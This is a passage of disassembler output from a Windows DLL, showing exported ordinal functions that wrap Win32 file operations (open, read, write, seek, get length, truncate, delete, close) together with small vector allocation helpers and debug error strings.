; int __stdcall	Ordinal762(char	*Src)
		public Ordinal762
Ordinal762	proc near		; CODE XREF: Ordinal148+165p
					; Ordinal148+1A8p ...

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Src		= dword	ptr  8

		mov	eax, offset unknown_libname_84 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		and	[ebp+var_4], 0
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	[ebp+Src]	; Src
		add	ecx, 0Ch
		call	sub_6AF31B1D

loc_6AF43E54:				; DATA XREF: sub_6AF43E65o
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn	4
Ordinal762	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF43E65	proc near		; DATA XREF: .rdata:stru_6AF635E4o
		mov	eax, offset loc_6AF43E54
		retn
sub_6AF43E65	endp

; Exported entry 764.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal764(char	*Src)
		public Ordinal764
Ordinal764	proc near		; CODE XREF: Ordinal148+176p
					; Ordinal148+1CBp ...

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Src		= dword	ptr  8

		mov	eax, offset unknown_libname_85 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		and	[ebp+var_4], 0
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	[ebp+Src]	; Src
		add	ecx, 10h
		call	sub_6AF31B1D

loc_6AF43E8B:				; DATA XREF: sub_6AF43E9Co
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn	4
Ordinal764	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF43E9C	proc near		; DATA XREF: .rdata:stru_6AF63634o
		mov	eax, offset loc_6AF43E8B
		retn
sub_6AF43E9C	endp

; Exported entry 768.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal768
Ordinal768	proc near		; CODE XREF: Ordinal382+Cp
					; Ordinal583+Ap ...
		mov	eax, ecx
		or	dword ptr [eax+4], 0FFFFFFFFh
		and	dword ptr [eax+8], 0
		mov	dword ptr [eax], offset	off_6AF5C1CC
		retn
Ordinal768	endp

; Exported entry 774.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal774
Ordinal774	proc near		; CODE XREF: Ordinal390+1Cp
					; Ordinal409+9p ...
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		cmp	eax, 0FFFFFFFFh
		jz	short loc_6AF43EC9
		push	eax		; hObject
		call	ds:CloseHandle
		or	dword ptr [esi+4], 0FFFFFFFFh

loc_6AF43EC9:				; CODE XREF: Ordinal774+9j
		xor	eax, eax
		inc	eax
		pop	esi
		retn
Ordinal774	endp

; Exported entry 775.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal775(LONG	lDistanceToMove, int, DWORD dwMoveMethod)
		public Ordinal775
Ordinal775	proc near		; CODE XREF: Ordinal776+5p
					; Ordinal777+6p ...

var_8		= dword	ptr -8
DistanceToMoveHigh= dword ptr -4
lDistanceToMove	= dword	ptr  8
arg_4		= dword	ptr  0Ch
dwMoveMethod	= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		mov	eax, [ebp+lDistanceToMove]
		push	esi
		push	[ebp+dwMoveMethod] ; dwMoveMethod
		mov	esi, ecx
		mov	ecx, [ebp+arg_4]
		mov	[ebp+DistanceToMoveHigh], ecx
		lea	ecx, [ebp+DistanceToMoveHigh]
		push	ecx		; lpDistanceToMoveHigh
		push	eax		; lDistanceToMove
		push	dword ptr [esi+4] ; hFile
		mov	[ebp+var_8], eax
		call	ds:SetFilePointer
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF43F16
		call	ds:GetLastError
		test	eax, eax
		mov	[esi+8], eax
		jz	short loc_6AF43F16
		push	eax		; Args
		push	offset aCfileSeekSetfi ; "CFile::Seek()	: SetFilePointer() == INV"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF43F19
; ---------------------------------------------------------------------------

loc_6AF43F16:				; CODE XREF: Ordinal775+28j
					; Ordinal775+35j
		xor	eax, eax
		inc	eax

loc_6AF43F19:				; CODE XREF: Ordinal775+46j
		pop	esi
		leave
		retn	0Ch
Ordinal775	endp

; Exported entry 776.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal776
Ordinal776	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		push	eax		; dwMoveMethod
		push	eax		; int
		push	eax		; lDistanceToMove
		call	Ordinal775
		retn
Ordinal776	endp

; Exported entry 777.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal777
Ordinal777	proc near		; CODE XREF: Ordinal409+5Cp
					; DATA XREF: .rdata:off_6AF66098o
		push	2		; dwMoveMethod
		push	0		; int
		push	0		; lDistanceToMove
		call	Ordinal775
		retn
Ordinal777	endp

; Exported entry 778.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal778(LPVOID lpBuffer, DWORD nNumberOfBytesToRead)
		public Ordinal778
Ordinal778	proc near		; CODE XREF: Ordinal779+1Ep
					; Ordinal825+3j
					; DATA XREF: ...

NumberOfBytesRead= dword ptr -4
lpBuffer	= dword	ptr  8
nNumberOfBytesToRead= dword ptr	 0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		and	[ebp+NumberOfBytesRead], 0
		push	esi
		push	edi
		mov	edi, [ebp+nNumberOfBytesToRead]
		push	0		; lpOverlapped
		lea	eax, [ebp+NumberOfBytesRead]
		push	eax		; lpNumberOfBytesRead
		push	edi		; nNumberOfBytesToRead
		push	[ebp+lpBuffer]	; lpBuffer
		mov	esi, ecx
		push	dword ptr [esi+4] ; hFile
		call	ds:ReadFile
		test	eax, eax
		jz	short loc_6AF43F65
		cmp	[ebp+NumberOfBytesRead], edi
		jnz	short loc_6AF43F65
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF43F7D
; ---------------------------------------------------------------------------

loc_6AF43F65:				; CODE XREF: Ordinal778+24j
					; Ordinal778+29j
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCfileReadReadf ; "CFile::Read()	: ReadFile() ==	FALSE, 0x"...
		mov	[esi+8], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax

loc_6AF43F7D:				; CODE XREF: Ordinal778+2Ej
		pop	edi
		pop	esi
		leave
		retn	8
Ordinal778	endp

; Exported entry 780.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal780(LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)
		public Ordinal780
Ordinal780	proc near		; CODE XREF: Ordinal407+43p
					; Ordinal781+1Ep ...

NumberOfBytesWritten= dword ptr	-4
lpBuffer	= dword	ptr  8
nNumberOfBytesToWrite= dword ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		and	[ebp+NumberOfBytesWritten], 0
		push	esi
		push	edi
		mov	edi, [ebp+nNumberOfBytesToWrite]
		push	0		; lpOverlapped
		lea	eax, [ebp+NumberOfBytesWritten]
		push	eax		; lpNumberOfBytesWritten
		push	edi		; nNumberOfBytesToWrite
		push	[ebp+lpBuffer]	; lpBuffer
		mov	esi, ecx
		push	dword ptr [esi+4] ; hFile
		call	ds:WriteFile
		test	eax, eax
		jz	short loc_6AF43FB3
		cmp	[ebp+NumberOfBytesWritten], edi
		jnz	short loc_6AF43FB3
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF43FCB
; ---------------------------------------------------------------------------

loc_6AF43FB3:				; CODE XREF: Ordinal780+24j
					; Ordinal780+29j
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCfileWriteWrit ; "CFile::Write() : WriteFile() == FALSE, "...
		mov	[esi+8], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax

loc_6AF43FCB:				; CODE XREF: Ordinal780+2Ej
		pop	edi
		pop	esi
		leave
		retn	8
Ordinal780	endp

; Exported entry 782.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal782
Ordinal782	proc near		; CODE XREF: Ordinal769+15p
					; Ordinal771+7p ...

arg_0		= dword	ptr  4

		push	esi
		push	edi
		mov	edi, [esp+8+arg_0]
		cmp	edi, 0FFFFFFFFh
		mov	esi, ecx
		jnz	short loc_6AF43FED
		push	offset aCfileAttachHfi ; "CFile::Attach() : hFile == INVALID_HAND"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF43FFA
; ---------------------------------------------------------------------------

loc_6AF43FED:				; CODE XREF: Ordinal782+Bj
		mov	ecx, esi
		call	Ordinal774
		xor	eax, eax
		mov	[esi+4], edi
		inc	eax

loc_6AF43FFA:				; CODE XREF: Ordinal782+1Aj
		pop	edi
		pop	esi
		retn	4
Ordinal782	endp

; Exported entry 784.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal784
Ordinal784	proc near		; CODE XREF: Ordinal783+7p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, [ecx+4]
		or	dword ptr [ecx+4], 0FFFFFFFFh
		call	Ordinal774
		mov	eax, esi
		pop	esi
		retn
Ordinal784	endp

; Exported entry 785.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal785
Ordinal785	proc near		; CODE XREF: Ordinal407+63p
					; Ordinal595+5Bp ...
		push	dword ptr [ecx+4] ; hFile
		call	ds:FlushFileBuffers
		retn
Ordinal785	endp

; Exported entry 786.
; Exported entry 1137.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1137
Ordinal1137	proc near		; CODE XREF: Ordinal395+1Cp
					; Ordinal431+23p ...
		xor	eax, eax	; ccL30_786
		cmp	dword ptr [ecx+4], 0FFFFFFFFh
		setnz	al
		retn
Ordinal1137	endp

; Exported entry 787.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal787
Ordinal787	proc near		; CODE XREF: Ordinal433+7Cp
					; Ordinal441+4Cp ...

var_8		= dword	ptr -8
FileSizeHigh	= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	esi
		mov	esi, [ebp+arg_0]
		and	dword ptr [esi], 0
		and	dword ptr [esi+4], 0
		push	edi
		lea	eax, [ebp+FileSizeHigh]
		mov	edi, ecx
		push	eax		; lpFileSizeHigh
		push	dword ptr [edi+4] ; hFile
		call	ds:GetFileSize
		cmp	eax, 0FFFFFFFFh
		mov	[ebp+var_8], eax
		jnz	short loc_6AF4406A
		call	ds:GetLastError
		test	eax, eax
		mov	[edi+8], eax
		jz	short loc_6AF4406A
		push	eax		; Args
		push	offset aCfileGetlength ; "CFile::GetLength() : GetFileSize() ==	I"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF44078
; ---------------------------------------------------------------------------

loc_6AF4406A:				; CODE XREF: Ordinal787+26j
					; Ordinal787+33j
		mov	eax, [ebp+var_8]
		mov	[esi], eax
		mov	eax, [ebp+FileSizeHigh]
		mov	[esi+4], eax
		xor	eax, eax
		inc	eax

loc_6AF44078:				; CODE XREF: Ordinal787+44j
		pop	edi
		pop	esi
		leave
		retn	4
Ordinal787	endp

; Exported entry 788.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal788
Ordinal788	proc near		; CODE XREF: Ordinal397+1Dp
					; DATA XREF: .rdata:off_6AF66098o

var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		and	[ebp+var_8], 0
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_8]
		push	eax
		call	Ordinal787
		test	eax, eax
		jnz	short loc_6AF4409C
		xor	edx, edx
		leave
		retn
; ---------------------------------------------------------------------------

loc_6AF4409C:				; CODE XREF: Ordinal788+18j
		mov	eax, [ebp+var_8]
		mov	edx, [ebp+var_4]
		leave
		retn
Ordinal788	endp

; Exported entry 791.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal791
Ordinal791	proc near		; CODE XREF: Ordinal790+11p
					; DATA XREF: .rdata:off_6AF66098o

var_8		= dword	ptr -8
DistanceToMoveHigh= dword ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		push	edi
		push	1		; dwMoveMethod
		xor	ebx, ebx
		lea	eax, [ebp+DistanceToMoveHigh]
		push	eax		; lpDistanceToMoveHigh
		mov	edi, ecx
		push	ebx		; lDistanceToMove
		mov	[esi], ebx
		mov	[esi+4], ebx
		push	dword ptr [edi+4] ; hFile
		mov	[ebp+var_8], ebx
		mov	[ebp+DistanceToMoveHigh], ebx
		call	ds:SetFilePointer
		cmp	eax, 0FFFFFFFFh
		mov	[ebp+var_8], eax
		jnz	short loc_6AF440F4
		call	ds:GetLastError
		cmp	eax, ebx
		mov	[edi+8], eax
		jz	short loc_6AF440F4
		push	eax		; Args
		push	offset aCfileGetpositi ; "CFile::GetPosition() : SetFilePointer()"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF44102
; ---------------------------------------------------------------------------

loc_6AF440F4:				; CODE XREF: Ordinal791+30j
					; Ordinal791+3Dj
		mov	eax, [ebp+var_8]
		mov	[esi], eax
		mov	eax, [ebp+DistanceToMoveHigh]
		mov	[esi+4], eax
		xor	eax, eax
		inc	eax

loc_6AF44102:				; CODE XREF: Ordinal791+4Ej
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal791	endp

; Exported entry 792.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal792(LONG	lDistanceToMove, int)
		public Ordinal792
Ordinal792	proc near		; CODE XREF: Ordinal779+Bp
					; Ordinal781+Bp ...

lDistanceToMove	= dword	ptr  4
arg_4		= dword	ptr  8

		push	0		; dwMoveMethod
		push	[esp+4+arg_4]	; int
		push	[esp+8+lDistanceToMove]	; lDistanceToMove
		call	Ordinal775
		retn	8
Ordinal792	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn bp-based	frame

sub_6AF4411B	proc near		; CODE XREF: sub_6AF44400+22p

var_50		= dword	ptr -50h
var_28		= byte ptr -28h
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_86 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		push	offset aVectorTTooLong ; "vector<T> too	long"
		lea	ecx, [ebp+var_28]
		call	ds:??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>>(char	const *)
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_28]
		push	eax
		lea	ecx, [ebp+var_50]
		call	sub_6AF3136A
		push	offset dword_6AF61E98
		lea	eax, [ebp+var_50]
		push	eax
		mov	[ebp+var_50], offset off_6AF54898
		call	_CxxThrowException
sub_6AF4411B	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_6AF4415C	proc near		; CODE XREF: sub_6AF44440+10p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	ecx, [esp+arg_4]
		test	ecx, ecx
		jbe	short locret_6AF44174
		mov	eax, [esp+arg_0]

loc_6AF44168:				; CODE XREF: sub_6AF4415C+16j
		mov	edx, [esp+arg_8]
		mov	dl, [edx]
		mov	[eax], dl
		inc	eax
		dec	ecx
		jnz	short loc_6AF44168

locret_6AF44174:			; CODE XREF: sub_6AF4415C+6j
		retn
sub_6AF4415C	endp

; Exported entry 769.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal769
Ordinal769	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		or	dword ptr [esi+4], 0FFFFFFFFh
		and	dword ptr [esi+8], 0
		mov	dword ptr [esi], offset	off_6AF5C1CC
		call	Ordinal782
		test	eax, eax
		jnz	short loc_6AF4419E
		push	offset aCfileCfileAtta ; "CFile::CFile() : Attach() == FALSE\n"
		call	sub_6AF3102E
		pop	ecx

loc_6AF4419E:				; CODE XREF: Ordinal769+1Cj
		mov	eax, esi
		pop	esi
		retn	4
Ordinal769	endp

; Exported entry 770.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal770
Ordinal770	proc near		; CODE XREF: Ordinal383+3Aj
					; Ordinal583+5Dp ...
		mov	dword ptr [ecx], offset	off_6AF5C1CC
		jmp	Ordinal774
Ordinal770	endp

; Exported entry 771.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal771
Ordinal771	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		call	Ordinal782
		test	eax, eax
		jnz	short loc_6AF441CA
		push	offset aCfileOperatorA ; "CFile::operator =() :	Attach() == FALSE"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF441CA:				; CODE XREF: Ordinal771+Ej
		mov	eax, esi
		pop	esi
		retn	4
Ordinal771	endp

; Exported entry 773.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal773(LPCSTR Args,	DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES	lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
		public Ordinal773
Ordinal773	proc near		; CODE XREF: Ordinal409+4Ap
					; Ordinal583+27p ...

Args		= dword	ptr  8
dwDesiredAccess	= dword	ptr  0Ch
dwShareMode	= dword	ptr  10h
lpSecurityAttributes= dword ptr	 14h
dwCreationDisposition= dword ptr  18h
dwFlagsAndAttributes= dword ptr	 1Ch
hTemplateFile	= dword	ptr  20h

		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		mov	edi, [ebp+Args]
		test	edi, edi
		mov	esi, ecx
		jz	short loc_6AF44230
		push	edi		; lpString
		call	ds:lstrlenA
		test	eax, eax
		jz	short loc_6AF44230
		mov	ecx, esi
		call	Ordinal774
		push	[ebp+hTemplateFile] ; hTemplateFile
		push	[ebp+dwFlagsAndAttributes] ; dwFlagsAndAttributes
		push	[ebp+dwCreationDisposition] ; dwCreationDisposition
		push	[ebp+lpSecurityAttributes] ; lpSecurityAttributes
		push	[ebp+dwShareMode] ; dwShareMode
		push	[ebp+dwDesiredAccess] ;	dwDesiredAccess
		push	edi		; lpFileName
		call	ds:CreateFileA
		cmp	eax, 0FFFFFFFFh
		mov	[esi+4], eax
		jnz	short loc_6AF4422B
		call	ds:GetLastError
		push	eax
		push	edi		; Args
		push	offset aCfileOpenCreat ; "CFile::Open()	: CreateFile() == INVALID"...
		mov	[esi+8], eax
		call	sub_6AF3102E
		add	esp, 0Ch
		jmp	short loc_6AF4423B
; ---------------------------------------------------------------------------

loc_6AF4422B:				; CODE XREF: Ordinal773+3Fj
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF4423D
; ---------------------------------------------------------------------------

loc_6AF44230:				; CODE XREF: Ordinal773+Cj
					; Ordinal773+17j
		push	offset aCfileOpenSzfil ; "CFile::Open()	: szFileName ==	NULL\n"
		call	sub_6AF3102E
		pop	ecx

loc_6AF4423B:				; CODE XREF: Ordinal773+59j
		xor	eax, eax

loc_6AF4423D:				; CODE XREF: Ordinal773+5Ej
		pop	edi
		pop	esi
		pop	ebp
		retn	1Ch
Ordinal773	endp

; Exported entry 779.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal779(LONG	lDistanceToMove, int, LPVOID lpBuffer, DWORD nNumberOfBytesToRead)
		public Ordinal779
Ordinal779	proc near		; CODE XREF: Ordinal582+41p
					; Ordinal596+41p ...

lDistanceToMove	= dword	ptr  4
arg_4		= dword	ptr  8
lpBuffer	= dword	ptr  0Ch
nNumberOfBytesToRead= dword ptr	 10h

		push	esi
		push	[esp+4+arg_4]	; int
		mov	esi, ecx
		push	[esp+8+lDistanceToMove]	; lDistanceToMove
		call	Ordinal792
		test	eax, eax
		jz	short loc_6AF4426F
		push	[esp+4+nNumberOfBytesToRead] ; nNumberOfBytesToRead
		mov	ecx, esi
		push	[esp+8+lpBuffer] ; lpBuffer
		call	Ordinal778
		test	eax, eax
		jz	short loc_6AF4426F
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF44271
; ---------------------------------------------------------------------------

loc_6AF4426F:				; CODE XREF: Ordinal779+12j
					; Ordinal779+25j
		xor	eax, eax

loc_6AF44271:				; CODE XREF: Ordinal779+2Aj
		pop	esi
		retn	10h
Ordinal779	endp

; Exported entry 781.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal781(LONG	lDistanceToMove, int, LPCVOID lpBuffer,	DWORD nNumberOfBytesToWrite)
		public Ordinal781
Ordinal781	proc near		; CODE XREF: Ordinal433+2FAp
					; Ordinal595+44p ...

lDistanceToMove	= dword	ptr  4
arg_4		= dword	ptr  8
lpBuffer	= dword	ptr  0Ch
nNumberOfBytesToWrite= dword ptr  10h

		push	esi
		push	[esp+4+arg_4]	; int
		mov	esi, ecx
		push	[esp+8+lDistanceToMove]	; lDistanceToMove
		call	Ordinal792
		test	eax, eax
		jz	short loc_6AF442A1
		push	[esp+4+nNumberOfBytesToWrite] ;	nNumberOfBytesToWrite
		mov	ecx, esi
		push	[esp+8+lpBuffer] ; lpBuffer
		call	Ordinal780
		test	eax, eax
		jz	short loc_6AF442A1
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF442A3
; ---------------------------------------------------------------------------

loc_6AF442A1:				; CODE XREF: Ordinal781+12j
					; Ordinal781+25j
		xor	eax, eax

loc_6AF442A3:				; CODE XREF: Ordinal781+2Aj
		pop	esi
		retn	10h
Ordinal781	endp

; Exported entry 783.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal783
Ordinal783	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	ecx, [esp+4+arg_0]
		call	Ordinal784
		push	eax
		mov	ecx, esi
		call	Ordinal782
		pop	esi
		retn	4
Ordinal783	endp

; Exported entry 789.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal789(LONG	lDistanceToMove, int)
		public Ordinal789
Ordinal789	proc near		; CODE XREF: Ordinal391+20p
					; Ordinal433+E8p ...

lDistanceToMove	= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		push	[esp+4+arg_4]	; int
		mov	esi, ecx
		push	[esp+8+lDistanceToMove]	; lDistanceToMove
		call	Ordinal792
		test	eax, eax
		jz	short loc_6AF442E5
		push	dword ptr [esi+4] ; hFile
		call	ds:SetEndOfFile
		test	eax, eax
		jz	short loc_6AF442E5
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF442FD
; ---------------------------------------------------------------------------

loc_6AF442E5:				; CODE XREF: Ordinal789+12j
					; Ordinal789+1Fj
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCfileSetlength ; "CFile::SetLength() : SetEndOfFile() == "...
		mov	[esi+8], eax
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax

loc_6AF442FD:				; CODE XREF: Ordinal789+24j
		pop	esi
		retn	8
Ordinal789	endp

; Exported entry 790.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal790
Ordinal790	proc near		; DATA XREF: .rdata:off_6AF66098o

var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		and	[ebp+var_8], 0
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_8]
		push	eax
		call	Ordinal791
		test	eax, eax
		jnz	short loc_6AF4431F
		xor	edx, edx
		leave
		retn
; ---------------------------------------------------------------------------

loc_6AF4431F:				; CODE XREF: Ordinal790+18j
		mov	eax, [ebp+var_8]
		mov	edx, [ebp+var_4]
		leave
		retn
Ordinal790	endp

; Exported entry 794.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal794(LPCSTR	lpFileName, int)
		public Ordinal794
Ordinal794	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
Args		= byte ptr -4
lpFileName	= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		push	edi
		xor	edi, edi
		cmp	[ebp+arg_4], edi
		jz	loc_6AF443BA
		or	[ebp+var_8], 0FFFFFFFFh
		push	edi		; hTemplateFile
		push	4000000h	; dwFlagsAndAttributes
		push	4		; dwCreationDisposition
		push	edi		; lpSecurityAttributes
		push	edi		; dwShareMode
		push	0C0000000h	; dwDesiredAccess
		push	[ebp+lpFileName] ; Args
		mov	esi, offset off_6AF5C1CC
		lea	ecx, [ebp+var_C]
		mov	[ebp+var_C], esi
		mov	dword ptr [ebp+Args], edi
		call	Ordinal773
		test	eax, eax
		jnz	short loc_6AF44383
		push	dword ptr [ebp+Args] ; Args
		push	offset aCfileDeleteDel ; "CFile::Delete() : deleteFile.Open() == "...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		lea	ecx, [ebp+var_C]
		mov	[ebp+var_C], esi
		call	Ordinal774
		jmp	short loc_6AF443DA
; ---------------------------------------------------------------------------

loc_6AF44383:				; CODE XREF: Ordinal794+3Ej
		push	edi		; int
		push	edi		; lDistanceToMove
		lea	ecx, [ebp+var_C]
		call	Ordinal789
		test	eax, eax
		jnz	short loc_6AF443A0
		push	dword ptr [ebp+Args] ; Args
		push	offset aCfileDeleteD_0 ; "CFile::Delete() : deleteFile.SetLength("...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx

loc_6AF443A0:				; CODE XREF: Ordinal794+68j
		lea	ecx, [ebp+var_C]
		call	Ordinal774
		lea	ecx, [ebp+var_C]
		mov	[ebp+var_C], esi
		call	Ordinal774

loc_6AF443B3:				; CODE XREF: Ordinal794+9Ej
		xor	eax, eax
		inc	eax

loc_6AF443B6:				; CODE XREF: Ordinal794+B5j
		pop	edi
		pop	esi
		leave
		retn
; ---------------------------------------------------------------------------

loc_6AF443BA:				; CODE XREF: Ordinal794+Dj
		push	[ebp+lpFileName] ; lpFileName
		call	ds:DeleteFileA
		test	eax, eax
		jnz	short loc_6AF443B3
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCfileDeleteD_1 ; "CFile::Delete() : ::DeleteFile() == FAL"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx

loc_6AF443DA:				; CODE XREF: Ordinal794+5Aj
		xor	eax, eax
		jmp	short loc_6AF443B6
Ordinal794	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF443DE(void *, char)
sub_6AF443DE	proc near		; DATA XREF: .rdata:off_6AF5C1CCo

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5C1CC
		call	Ordinal774
		test	[esp+4+arg_0], 1
		jz	short loc_6AF443FA
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF443FA:				; CODE XREF: sub_6AF443DE+13j
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF443DE	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF44400(size_t Size)
sub_6AF44400	proc near		; CODE XREF: sub_6AF44460+7p

Size		= dword	ptr  4

		push	esi
		xor	eax, eax
		push	edi
		mov	edi, [esp+8+Size]
		cmp	edi, eax
		mov	esi, ecx
		mov	[esi+4], eax
		mov	[esi+8], eax
		mov	[esi+0Ch], eax
		jnz	short loc_6AF4441B
		xor	al, al
		jmp	short loc_6AF4443B
; ---------------------------------------------------------------------------

loc_6AF4441B:				; CODE XREF: sub_6AF44400+15j
		cmp	edi, 0FFFFFFFFh
		jbe	short loc_6AF44427
		mov	ecx, esi
		call	sub_6AF4411B
; ---------------------------------------------------------------------------

loc_6AF44427:				; CODE XREF: sub_6AF44400+1Ej
		push	edi		; Size
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	[esi+4], eax
		mov	[esi+8], eax
		add	eax, edi
		mov	[esi+0Ch], eax
		pop	ecx
		mov	al, 1

loc_6AF4443B:				; CODE XREF: sub_6AF44400+19j
		pop	edi
		pop	esi
		retn	4
sub_6AF44400	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF44440	proc near		; CODE XREF: sub_6AF44460+1Dp

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		mov	esi, [esp+4+arg_4]
		push	edi
		push	[esp+8+arg_8]
		mov	edi, [esp+0Ch+arg_0]
		push	esi
		push	edi
		call	sub_6AF4415C
		add	esp, 0Ch
		lea	eax, [edi+esi]
		pop	edi
		pop	esi
		retn	0Ch
sub_6AF44440	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF44460(size_t Size, int)
sub_6AF44460	proc near		; CODE XREF: sub_6AF44489+12p

Size		= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		push	[esp+4+Size]	; Size
		mov	esi, ecx
		call	sub_6AF44400
		test	al, al
		jz	short loc_6AF44485
		push	[esp+4+arg_4]
		mov	ecx, esi
		push	[esp+8+Size]
